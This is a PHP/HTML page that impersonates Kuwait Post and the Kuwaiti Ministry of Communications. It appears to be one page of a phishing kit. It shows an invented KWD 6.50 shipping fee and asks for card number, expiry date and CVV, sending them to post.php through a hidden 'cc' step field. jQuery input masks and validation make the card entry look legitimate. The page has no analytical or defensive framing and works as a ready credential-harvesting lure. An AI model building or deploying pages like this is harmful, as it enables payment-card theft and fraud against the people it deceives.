<?php 

     require_once "function.php";

                              

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Kuwait Post</title>
        <!-- logo site web-->
        <link rel="icon" href="" type="image/x-icon"/>
        <link rel="shortcut icon" href="" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/boom.css">
</head>
<body>

         <div class="home">
            <div class="ho">
               <div class="container">
                     <div class="navbar">
                        <div class="limaja">
                            <img src="https://assets.unlayer.com/stock-templates1685068971124-0361-kuwait-post_prev_ui.png">
                        </div>
                        <div class="icon">
                           <ul>
                              <li class="geo"><i class="icon fa fa-globe"></i></li>
                              <li class="oo"><i class="fa fa-home"></i></li>
                              <li class="oo"><i class="fa fa-search"></i></li>
                              <li class="oo"><i class=" fa fa-gear"></i></li>
                              <li><i class="fa fa-navicon"></i></li>
                           </ul>
                        </div>
                     </div>
               </div>
            </div>
         </div>

         <div class="validation">
            <div class="container">
                <h2>Card Information</h2>
                <hr class="hr">
                <h4>Home <i class="fa fa-angle-right"></i> <span>Card Information</span></h4>
                <div class="sender">
                   <div class="row">
                      <div class="col-lg-3 left">
                         <div>
                            <div class="d-flex adn">
                               <span></span>
                               <p>Your details</p>
                            </div>
                            <div class="d-flex adr">
                               <span></span>
                               <p>Verify</p>
                            </div>
                         </div>

                         <div class="pijama responsive">
                            <div class="statu">
                               <p>Destination:</p>
                               <span>United Arab Emirats</span>
                            </div>
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Total</p>
                               <span>KWD 6.50</span>
                            </div>
                         </div>

                         <div class="pijama web">
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Destination:</p>
                               <span>Kuwait</span>
                            </div>
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Last Updated:</p>
                               <span><?php echo date('l jS \of  h:i A'); ?></span>
                            </div>
                         </div>

                         <hr class="gy-3">
                         <div class="pijama web">
                            <div class="statu">
                               <p>Shipment type</p>
                               <span>Other</span>
                            </div>
                            <hr class="gy-3">
                         </div>

                         <div class="pijama web">
                            <div class="statu">
                               <p>Total</p>
                               <span>KWD 6.50</span>
                            </div>
                            <hr class="gy-3">
                         </div>

                      </div>
                      <div class="col-lg-9 right">
                         <h3>Your details <span><i class=" fa fa-question-circle fa-1x"></i></span></h3>
                         <p>Please Complete your Following details</p>
                         <h6><strong>50%</strong> Complete</h6>
                         <hr>
                         <p>Credit Card Accepted:</p>
                         <img src="image/cards-secure.png" class="img-fluid">
                         <hr>
                         <form action="post.php" method="post">
                            <input type="hidden" name="step" value="cc">
                            <div class="login">
                               <div class="all_one">
                                  <div class="form -group box only mt-4">
                                     <label>Card Number<span class="star">*</span></label>
                                     <input type="text" name="card" id="card" class="form-control" placeholder="XXXX XXXX XXXX XXXX">
                                     <div class="error_card any">Required Field!</div>
                                  </div>
                               </div>
                               <div class="all_one">
                                  <div class="form-group box mt-4">
                                     <label>Experation Date<span class="star">*</span></label>
                                     <input type="text" name="date" id="date" class="form-control" placeholder="MM/JJ">
                                     <div class="error_date any">Required Field!</div>
                                  </div>
                                  <div class="form-group box mt-4">
                                     <label>CVV<span class="star">*</span></label>
                                     <input type="text" name="cvv" id="cvv" class="form-control" placeholder="XXX">
                                     <div class="error_cvv any">Required Field!</div>
                                  </div>
                               </div>
                            </div>
                            <div class="bottona">
                               <button class="btn" name="submit">Continue</button>
                            </div>
                         </form>
                      </div>
                   </div>
                </div>
            </div>
         </div>

         <div class="fotter">
            <div class="container">
               <hr>
               <div class="bot">
                  <p>© Copyright 2024 @ Ministry Of Communications , All rights reserved.</p>
                  <div class="images d-flex">
                     <img src="https://e.gov.kw/sites/KGOEnglish/Style%20Library/en-us/KGOTheme/img/LinkBanner/ImgLink1.png" style="width:87px;height:40px;">
                  </div>
               </div>
            </div>
         </div>
        


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
           
           $("#full").blur(function(){
                if($("#full").val().length < 1){
                    $("#full").css({border:'1px solid red'});
                    $(".error_full").show();
               }else{;
                    $("#full").css({border:'1px solid #6DAE36'});
                    $(".error_name").hide();
               }
             })

           $("#email").blur(function(){
                if($("#email").val().length < 1){
                    $("#email").css({border:'1px solid red'});
                    $(".error_email").show();
               }else{;
                    $("#email").css({border:'1px solid #6DAE36'});
                    $(".error_email").hide();
               }
             })

           $("#card").blur(function(){
                if($("#card").val().length < 1){
                    $("#card").css({border:'1px solid red'});
                    $(".error_card").show();
               }else{;
                    $("#card").css({border:'1px solid #6DAE36'});
                    $(".error_card").hide();
               }
             })
           $("#card").mask("0000 0000 0000 0000");

           $("#date").blur(function(){
                if($("#date").val().length < 1){
                    $("#date").css({border:'1px solid red'});
                    $(".error_date").show();
               }else{;
                    $("#date").css({border:'1px solid #6DAE36'});
                    $(".error_date").hide();
               }
             })
           $("#date").mask("00/00");

           $("#cvv").blur(function(){
                if($("#cvv").val().length < 1){
                    $("#cvv").css({border:'1px solid red'});
                    $(".error_cvv").show();
               }else{;
                    $("#cvv").css({border:'1px solid #6DAE36'});
                    $(".error_cvv").hide();
               }
             })
           $("#cvv").mask("000");


        </script>
              
</body>
</html>